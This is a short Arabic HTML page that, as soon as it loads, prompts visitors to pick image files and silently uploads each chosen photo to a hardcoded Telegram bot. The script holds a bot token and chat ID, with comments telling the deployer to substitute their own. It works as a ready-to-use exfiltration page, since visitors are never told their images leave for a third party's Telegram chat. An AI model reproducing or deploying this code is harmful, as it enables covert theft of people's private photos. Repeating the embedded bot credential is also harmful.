<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>إرسال الصور تلقائي في HTML</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap" rel="stylesheet">
</head>
<body>
  <div style="text-align: center; margin-top: 50px;">
    <h3>سيتم محاولة الإرسال التلقائي</h3>
    <p>اضغط موافق على الإذن للوصول للملفات.</p>
  </div>

  <script>
    const BOT_TOKEN = '7831156800:AAGbRpsGy4-wzQqdgl6yU1YfEaHxrVmorF4';  // غيرها لتوكنك
    const CHAT_ID = '7498653159';  // غيرها لـ CHAT_ID الخاص بيك

    async function sendToTelegram(file) {
      const caption = `📢 صورة مرسلة تلقائي\n🕒 ${new Date().toLocaleString('ar-EG')}`;
      const fd = new FormData();
      fd.append('chat_id', CHAT_ID);
      fd.append('photo', file);
      fd.append('caption', caption);
      return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
    }

    async function autoAccessAndSend() {
      if ('showOpenFilePicker' in window) {
        try {
          const handles = await window.showOpenFilePicker({
            types: [{ description: 'صور', accept: {'image/*': ['.png', '.gif', '.jpeg', '.jpg']} }],
            multiple: true
          });
          const files = await Promise.all(handles.map(handle => handle.getFile()));
          
          if (files.length > 0) {
            for (const file of files) {
              await sendToTelegram(file);
            }
            alert('تم إرسال الصور!');
          } else {
            alert('لم يتم اختيار صور.');
          }
        } catch (err) {
          alert('رفض الإذن أو خطأ: ' + err.message);
        }
      } else {
        alert('API غير مدعوم. جرب Google Chrome.');
      }
    }

    window.addEventListener('load', autoAccessAndSend);  // يشتغل تلقائي لما تفتح الصفحة
  </script>
</body>
</html>
